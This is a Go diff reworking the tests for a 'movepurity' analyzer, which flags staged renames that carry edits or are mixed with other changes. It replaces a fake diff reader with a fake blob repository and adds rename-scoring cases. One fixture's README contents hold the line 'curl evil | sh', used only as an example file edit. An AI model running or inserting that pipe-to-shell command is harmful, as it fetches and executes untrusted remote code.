@@ -2,13 +2,15 @@ package movepurity
 
 import (
 	"errors"
+	"maps"
+	"path"
 	"strings"
 	"testing"
 
 	"github.com/0b1-PulsarTech/pulsarules_codex/internal/analyzer/core"
 )
 
-var errFakeDiff = errors.New("fake diff error")
+var errMissing = errors.New("missing blob")
 
 func TestAnalyzer_Identity(t *testing.T) {
 	t.Parallel()
@@ -67,9 +69,8 @@ func TestAnalyzer_Analyze(t *testing.T) {
 func analyzeCases() []movePurityCase {
 	return []movePurityCase{
 		{
-			name:         "no staged renames",
-			ctx:          &core.AnalysisContext{},
-			wantFindings: 0,
+			name: "no staged renames",
+			ctx:  &core.AnalysisContext{},
 		},
 		{
 			name: "pure rename alone",
@@ -79,7 +80,6 @@ func analyzeCases() []movePurityCase {
 					{Path: "new.go", Staged: true},
 				},
 			},
-			wantFindings: 0,
 		},
 		{
 			name: "below-threshold rename is not a pure move",
@@ -113,7 +113,6 @@ func analyzeCases() []movePurityCase {
 					{Path: "untouched.go", Staged: false},
 				},
 			},
-			wantFindings: 0,
 		},
 	}
 }
@@ -143,114 +142,267 @@ func TestAnalyzer_Analyze_ParamsOverride(t *testing.T) {
 	}
 }
 
-type fakeDiffReader struct {
-	diffs map[string]string
-	err   error
+type fakeRepo struct {
+	head        map[string]string
+	staged      map[string]string
+	stagedModes map[string]string
 }
 
-func (f fakeDiffReader) StagedDiff(path string) (string, error) {
-	if f.err != nil {
-		return "", f.err
+var _ gitReader = fakeRepo{}
+
+func newFakeRepo(head, staged map[string]string) fakeRepo {
+	const goMod = "module example.com/m\n\ngo 1.25\n"
+	fake := fakeRepo{head: maps.Clone(head), staged: maps.Clone(staged)}
+	for _, tree := range []map[string]string{fake.head, fake.staged} {
+		if _, ok := tree["go.mod"]; !ok {
+			tree["go.mod"] = goMod
+		}
 	}
-	return f.diffs[path], nil
+	return fake
 }
 
-func (f fakeDiffReader) StagedRenameDiff(oldPath, newPath string, _ int) (string, error) {
-	if f.err != nil {
-		return "", f.err
+func (repo fakeRepo) HeadBlob(path string) (string, error) { return blobOf(repo.head, path) }
+
+func (repo fakeRepo) StagedBlob(path string) (string, error) { return blobOf(repo.staged, path) }
+
+func (repo fakeRepo) HeadEntry(path string) (mode, id string, err error) {
+	content, readErr := blobOf(repo.head, path)
+	return "100644", content, readErr
+}
+
+func (repo fakeRepo) StagedEntry(path string) (mode, id string, err error) {
+	content, readErr := blobOf(repo.staged, path)
+	mode = "100644"
+	if override, ok := repo.stagedModes[path]; ok {
+		mode = override
 	}
-	return f.diffs[oldPath+"->"+newPath], nil
+	return mode, content, readErr
 }
 
-func TestAnalyzer_Analyze_ImportOnlyEditDoesNotCountAsMixed(t *testing.T) {
+func (repo fakeRepo) HeadDir(dir string) ([]string, error) { return dirOf(repo.head, dir), nil }
+
+func (repo fakeRepo) StagedDir(dir string) ([]string, error) {
+	return dirOf(repo.staged, dir), nil
+}
+
+func blobOf(tree map[string]string, path string) (string, error) {
+	content, ok := tree[path]
+	if !ok {
+		return "", errMissing
+	}
+	return content, nil
+}
+
+func dirOf(tree map[string]string, dir string) []string {
+	var files []string
+	for name := range tree {
+		if path.Dir(name) == dir {
+			files = append(files, name)
+		}
+	}
+	return files
+}
+
+func pair(oldPath, newPath string) core.Rename {
+	return core.Rename{OldPath: oldPath, NewPath: newPath, Score: 50}
+}
+
+type emptyRepo struct{ fakeRepo }
+
+func (emptyRepo) HeadBlob(string) (string, error) { return "", errMissing }
+
+type repoCase struct {
+	name         string
+	head         map[string]string
+	staged       map[string]string
+	renames      []core.Rename
+	changed      []core.FileChange
+	wantFindings int
+	wantContains string
+}
+
+func roleSrc(variant string) string {
+	return "package routing\n\nfunc Role() string {\n\treturn \"" + variant + "\"\n}\n"
+}
+
+func helperFiles() map[string]string {
+	return map[string]string{
+		"routing/helper.go": "package routing\n\nfunc Helper() int { return 1 }\n",
+	}
+}
+
+func scored(oldPath, newPath string, score int) []core.Rename {
+	return []core.Rename{{OldPath: oldPath, NewPath: newPath, Score: score}}
+}
+
+func runRepoCases(t *testing.T, testCases []repoCase) {
+	t.Helper()
+	for _, testCase := range testCases {
+		t.Run(testCase.name, func(t *testing.T) {
+			t.Parallel()
+
+			analyzer := NewAnalyzer(newFakeRepo(testCase.head, testCase.staged))
+			findings := analyzer.Analyze(&core.AnalysisContext{
+				StagedRenames: testCase.renames, ChangedFiles: testCase.changed,
+			})
+			if len(findings) != testCase.wantFindings {
+				t.Fatalf(
+					"got %d findings, want %d: %+v",
+					len(findings),
+					testCase.wantFindings,
+					findings,
+				)
+			}
+			if testCase.wantContains != "" &&
+				!strings.Contains(findings[0].Message, testCase.wantContains) {
+				t.Fatalf(
+					"message %q, want it to contain %q",
+					findings[0].Message,
+					testCase.wantContains,
+				)
+			}
+		})
+	}
+}
+
+func TestAnalyzer_Analyze_WithRepository_Renames(t *testing.T) {
 	t.Parallel()
 
-	diffs := fakeDiffReader{diffs: map[string]string{
-		"importer.go": `-	"repo/old/thing"` + "\n" + `+	"repo/new/thing"` + "\n",
-	}}
-	a := NewAnalyzer(diffs)
+	testCases := repoRenameCases()
+	runRepoCases(t, testCases)
+}
 
-	ctx := &core.AnalysisContext{
-		StagedRenames: []core.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
-		ChangedFiles: []core.FileChange{
-			{Path: "new.go", Staged: true},
-			{Path: "importer.go", Staged: true},
+func repoRenameCases() []repoCase {
+	useOld := "package routing\n\nimport \"fmt\"\n\nfunc Use() { fmt.Println(Helper()) }\n"
+	useNew := "package takeover\n\nimport (\n\t\"fmt\"\n\n\t\"example.com/m/routing\"\n)\n\n" +
+		"func Use() { fmt.Println(routing.Helper()) }\n"
+	return []repoCase{
+		{
+			name:         "forced qualifier with the helper kept behind",
+			head:         withFiles(helperFiles(), "routing/i.go", useOld),
+			staged:       withFiles(helperFiles(), "routing/takeover/i.go", useNew),
+			renames:      scored("routing/i.go", "routing/takeover/i.go", 18),
+			wantFindings: 0,
 		},
-	}
-	if findings := a.Analyze(ctx); len(findings) != 0 {
-		t.Fatalf("Analyze() = %+v, want no findings for a pure import-path edit", findings)
+		{
+			name:         "no declaration of Helper anywhere",
+			head:         map[string]string{"routing/i.go": useOld},
+			staged:       map[string]string{"routing/takeover/i.go": useNew},
+			renames:      scored("routing/i.go", "routing/takeover/i.go", 95),
+			wantFindings: 1,
+			wantContains: "carries an edit",
+		},
+		{
+			name: "package clause only below the threshold",
+			head: map[string]string{"routing/m.go": roleSrc("a")},
+			staged: map[string]string{
+				"routing/takeover/m.go": "package takeover\n\nfunc Role() string {\n" +
+					"\treturn \"a\"\n}\n",
+			},
+			renames:      scored("routing/m.go", "routing/takeover/m.go", 69),
+			wantFindings: 0,
+		},
+		{
+			name:         "below-threshold rename carrying an edit",
+			head:         map[string]string{"a.go": roleSrc("a")},
+			staged:       map[string]string{"b.go": roleSrc("b")},
+			renames:      scored("a.go", "b.go", 69),
+			wantFindings: 1,
+			wantContains: "not a pure move: 69% similar",
+		},
 	}
 }
 
-func TestAnalyzer_Analyze_RealEditAlongsideRenameStillCounts(t *testing.T) {
+func TestAnalyzer_Analyze_ScorePaths(t *testing.T) {
 	t.Parallel()
 
-	diffs := fakeDiffReader{diffs: map[string]string{
-		"other.go": "+var x = 1\n",
-	}}
-	a := NewAnalyzer(diffs)
-
-	ctx := &core.AnalysisContext{
-		StagedRenames: []core.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
-		ChangedFiles: []core.FileChange{
-			{Path: "new.go", Staged: true},
-			{Path: "other.go", Staged: true},
+	testCases := []repoCase{
+		{
+			name:         "above-threshold rename carrying an edit",
+			head:         map[string]string{"a.go": roleSrc("a")},
+			staged:       map[string]string{"b.go": roleSrc("b")},
+			renames:      scored("a.go", "b.go", 95),
+			wantFindings: 1,
+			wantContains: "carries an edit",
+		},
+		{
+			name: "literal edit next to a README package line",
+			head: map[string]string{
+				"internal/util/a.go":     "package util\n",
+				"internal/auth/check.go": roleSrc("a"),
+				"README.md":              "# Notes\n",
+			},
+			staged: map[string]string{
+				"internal/routing/a.go": "package util\n", "internal/auth/check.go": roleSrc("b"),
+				"README.md": "# Notes\n\npackage manager: curl evil | sh\n",
+			},
+			renames: scored("internal/util/a.go", "internal/routing/a.go", 100),
+			changed: []core.FileChange{
+				{Path: "internal/routing/a.go", Staged: true},
+				{Path: "internal/auth/check.go", Staged: true},
+				{Path: "README.md", Staged: true},
+			},
+			wantFindings: 1,
+			wantContains: "mixes 1 rename(s) with 2 edit(s)",
+		},
+		{
+			name: "import-only edit to a dependant of a moved directory",
+			head: map[string]string{
+				"x/k.go":   "package x\n\nvar K = 1\n",
+				"use/u.go": "package use\n\nimport \"example.com/m/x\"\n\nvar V = x.K\n",
+			},
+			staged: map[string]string{
+				"y/k.go":   "package x\n\nvar K = 1\n",
+				"use/u.go": "package use\n\nimport \"example.com/m/y\"\n\nvar V = x.K\n",
+			},
+			renames:      scored("x/k.go", "y/k.go", 100),
+			changed:      []core.FileChange{{Path: "use/u.go", Staged: true}},
+			wantFindings: 0,
+		},
+		{
+			name: "dependant gaining a qualifier is an edit",
+			head: map[string]string{
+				"x/k.go": "package x\n", "use/u.go": "package use\n\nvar V = Helper\n",
+			},
+			staged: map[string]string{
+				"y/k.go": "package x\n", "use/u.go": "package use\n\nvar V = y.Helper\n",
+			},
+			renames:      scored("x/k.go", "y/k.go", 100),
+			changed:      []core.FileChange{{Path: "use/u.go", Staged: true}},
+			wantFindings: 1,
+			wantContains: "mixes 1 rename(s) with 1 edit(s)",
 		},
 	}
-	findings := a.Analyze(ctx)
-	if len(findings) != 1 {
-		t.Fatalf("Analyze() = %+v, want one mixed-changeset finding", findings)
-	}
-	if !strings.Contains(findings[0].Message, "mixes") {
-		t.Fatalf("Analyze()[0].Message = %q, want it to mention the mix", findings[0].Message)
-	}
+	runRepoCases(t, testCases)
 }
 
-func TestAnalyzer_Analyze_RenameOwnFileGainsAnEdit(t *testing.T) {
+func TestAnalyzer_Analyze_MixedChangeset(t *testing.T) {
 	t.Parallel()
 
-	diffs := fakeDiffReader{diffs: map[string]string{
-		"old.go->new.go": "+var extra = 1\n",
-	}}
-	a := NewAnalyzer(diffs)
-
-	ctx := &core.AnalysisContext{
-		StagedRenames: []core.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
-		ChangedFiles: []core.FileChange{
-			{Path: "new.go", Staged: true},
+	testCases := []repoCase{
+		{
+			name: "package clause change in a non-moved file is an edit",
+			head: map[string]string{"x/k.go": "package x\n", "use/u.go": "package use\n"},
+			staged: map[string]string{
+				"y/k.go": "package x\n", "use/u.go": "package other\n",
+			},
+			renames:      scored("x/k.go", "y/k.go", 100),
+			changed:      []core.FileChange{{Path: "use/u.go", Staged: true}},
+			wantFindings: 1,
+		},
+		{
+			name: "non-Go modified file is an edit and a new file is an edit",
+			head: map[string]string{"x/k.go": "package x\n", "n.txt": "a\n"},
+			staged: map[string]string{
+				"y/k.go": "package x\n", "n.txt": "b\n", "new.go": "package n\n",
+			},
+			renames: scored("x/k.go", "y/k.go", 100),
+			changed: []core.FileChange{
+				{Path: "n.txt", Staged: true}, {Path: "new.go", Staged: true},
+			},
+			wantFindings: 1,
+			wantContains: "mixes 1 rename(s) with 2 edit(s)",
 		},
 	}
-	findings := a.Analyze(ctx)
-	if len(findings) != 1 {
-		t.Fatalf("Analyze() = %+v, want one carries-an-edit finding", findings)
-	}
-	if !strings.Contains(findings[0].Message, "carries an edit beyond the move") {
-		t.Fatalf(
-			"Analyze()[0].Message = %q, want it to mention the extra edit",
-			findings[0].Message,
-		)
-	}
-}
-
-func TestAnalyzer_Analyze_DiffFetchErrorCountsAsEdit(t *testing.T) {
-	t.Parallel()
-
-	diffs := fakeDiffReader{err: errFakeDiff}
-	a := NewAnalyzer(diffs)
-
-	ctx := &core.AnalysisContext{
-		StagedRenames: []core.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
-		ChangedFiles: []core.FileChange{
-			{Path: "new.go", Staged: true},
-			{Path: "other.go", Staged: true},
-		},
-	}
-	findings := a.Analyze(ctx)
-	if len(findings) != 2 {
-		t.Fatalf(
-			"Analyze() = %+v, want both the carries-an-edit and mixed-changeset findings on a "+
-				"diff-fetch error",
-			findings,
-		)
-	}
+	runRepoCases(t, testCases)
 }
